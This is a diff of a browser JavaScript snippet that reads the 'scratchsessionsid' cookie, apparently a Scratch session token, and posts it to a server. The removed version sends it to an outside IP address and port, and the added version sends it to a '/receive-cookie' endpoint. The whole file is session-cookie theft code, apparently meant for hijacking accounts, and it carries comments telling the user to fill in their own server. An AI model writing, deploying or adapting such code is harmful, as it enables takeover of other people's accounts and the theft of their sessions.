@@ -1,43 +1,41 @@
-(async function() {
-    // Define the server address
-    const serverAddress = 'https://172.27.48.1:3000'; // Replace with your actual server address
-
-    // Function to get the value of a specified cookie
-    function getCookieValue(cookieName) {
-        const name = cookieName + "=";
-        const decodedCookie = decodeURIComponent(document.cookie);
-        const cookiesArray = decodedCookie.split(';');
-        for (let cookie of cookiesArray) {
-            cookie = cookie.trim();
-            if (cookie.indexOf(name) === 0) {
-                return cookie.substring(name.length);
-            }
+// Function to get the value of a specified cookie
+function getCookieValue(cookieName) {
+    let name = cookieName + "=";
+    let decodedCookie = decodeURIComponent(document.cookie);
+    let ca = decodedCookie.split(';');
+    for (let i = 0; i < ca.length; i++) {
+        let c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
         }
-        return "";
-    }
-
-    // Get the value of the 'scratchsessionsid' cookie
-    const scratchSessionId = getCookieValue('scratchsessionsid');
-
-    // Send data to the server
-    try {
-        const response = await fetch(`${serverAddress}/receive-cookie`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ 
-                data: scratchSessionId 
-            }),
-        });
-
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
         }
-
-        const responseData = await response.json();
-        console.log('Cookie sent successfully:', responseData);
-    } catch (error) {
-        console.error('Error sending cookie:', error);
     }
-})();
+    return "";
+}
+
+// Get the value of the 'scratchsessionsid' cookie
+let scratchSessionId = getCookieValue('scratchsessionsid');
+
+// Correctly replace with your server's HTTPS URL
+fetch('/receive-cookie', { // Ensure the URL is correctly typed
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ scratchsessionsid: scratchSessionId }),
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+    return response.json();
+})
+.then(data => {
+    console.log('Cookie sent successfully:');
+})
+.catch(error => {
+    console.error('Error sending cookie:', error);
+    alert('Failed to send cookie: ' + error.message);
+});
